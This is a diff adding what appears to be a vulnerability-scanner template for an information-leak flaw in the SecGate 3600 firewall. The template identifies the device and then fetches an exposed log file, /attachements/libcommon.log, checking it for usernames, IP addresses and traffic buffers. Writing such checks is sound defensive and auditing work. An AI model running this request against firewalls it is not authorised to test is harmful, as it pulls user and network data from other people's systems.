@@ -1,0 +1,26 @@
+id: poc-yaml-secgate-3600-libcommon-info-leak
+info:
+  name: 网神SecGate3600防火墙 libcommon 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: 信息泄露,infodisclosure
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "网神SecGate 3600防火墙"
+  - method: GET
+    path:
+      - "{{BaseURL}}/attachements/libcommon.log"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "username:"
+          - "ip:"
+          - "receive buf:"
+          - "send buf:"
